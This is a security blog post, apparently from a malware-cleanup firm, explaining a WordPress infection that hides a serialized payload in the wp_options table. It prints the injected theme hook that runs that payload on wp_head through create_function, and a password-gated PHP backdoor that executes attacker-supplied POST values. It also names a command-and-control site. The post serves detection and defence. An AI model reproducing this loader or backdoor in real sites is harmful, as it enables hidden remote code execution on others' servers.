@@ -1,0 +1,49 @@
+WordPress Database Table and wp_head Injections
+
+There are multiple places where a malware injection can be hidden on a web site. On WordPress, for example, it can be hidden inside the core files, themes, plugins, .htaccess and on the database. More often than not, the malware uses a combination of those which makes it harder to detect.
+Today, we will talk about a database injection that we are seeing often lately, that uses wp_head() to display the malware to anyone visiting a compromised web site.
+Database Injection
+WordPress offers multiple API calls to manage and read the content from inside the database. One of those calls is the get_option function that returns a value from the wp_options table. The wp_options table is widely used by many plugins and themes to store long term data, and is generally full of entries making it a good place to hide malicious code.
+If you don’t believe me and you use WordPress, just list the wp_options table from your site to see what I am talking about.
+Here’s what we are finding inside the wp_options table under “page_option” on some compromised sites:
+
+s:7546:"a:18:{i:0;s:10:"11-07-
+2013";i:1;s:1:"e";i:2;s:32:"061d57e97e504a23cc932031f712f730";
+i:3;s:32:"07b6910226033fa5ee75721b4fc6573f";
+i:4;s:4:"val(";i:5;s:32:"2a27230f54e4cea4a8ed38d66e2c0";
+i:6;s:1:"(";i:7;s:6993:"'LyogTXVuaW5uIHZlcnNpb246MSBkYXRlOjIxLj
+VFsncGFzcyddKT09PSc2OTJlM2Y1MmVlNmYxNmJjNzhmYTZlMWVjNGJkNGE2YSc
+VCwgRVhUUl9TS0lQKTsKCglpZighZW1wdHkoJHRob3IpKQoJCUAkdGhvcigkaGF
+dGlvbl9leGlzdHMgKCdzdHJpcG9zJykpIHsKCWZ1bmN0aW9uIHN0cmlwb3MgKCR
+G9mZnNldD0wKSB7CgkJcmV0dXJuIHN0cnBvcyAoc3RydG...
+... very long ..
+
+As you can see, it is a serialized PHP entry (fully decoded on ddecode) that on first glance, doesn’t look too bad and can’t really cause any harm on its own.
+Executing the database content
+The malicious code was hidden inside the database, but how can it be executed? The attackers, in addition to injecting that content, also modified the theme’s index.php file with this code:
+
+function page_options() { $option = get_option("page_option"); $opt= unserialize( $option);
+@$arg = create_function("", $opt[1] .$opt[4] .$opt[10]. $opt[12].$opt[14]. $opt[7] );
+return $arg('');}
+add_action('wp_head', 'page_options');
+
+And that’s where everything ties together.
+
+This code uses get_option to download the content from “page_option” from the DB: get_option("page_option");
+Since the content is serialized, it unserialize() it: $opt= unserialize( $option);
+It than builds a new function called $arg and executes it based on the content retrieved. Only when that function executes that the malware gets executed live: @$arg = create_function..
+
+The final piece of the puzzle is done by the add_action() function. It causes the attackers function to be executed at the head (initialization) of WordPress.
+What is interesting is that with such simple code, they are able to bypass most security tools that look for eval’s, or base64_decode’s, or system calls for a sign of compromise.
+Backdoor + injection
+This piece of malware, once installed on a compromised site, acts as a backdoor (executing the values from the POST variables Thor and Hammer):
+
+if( @md5($_POST["pass"])==='692e3f52ee6f16bc78fa6e1ec4bd4a6a') {
+@extract( $_POST, EXTR_SKIP);
+if(!empty($thor))
+@$thor( $hammer);
+}
+
+This malware also injects malicious content related to the “WORDPRESS COUNTER” injection on the browser of anyone visiting the site (downloaded from the command and control site: httx://kadaffizzet.com/kasiapa).
+Conclusion
+You can’t rely on simple keyword searching to identify malware injections. The attackers are evolving and using multiple tactics to hide their backdoors and malicious tools. If you need help cleaning up a WordPress site, let us know.
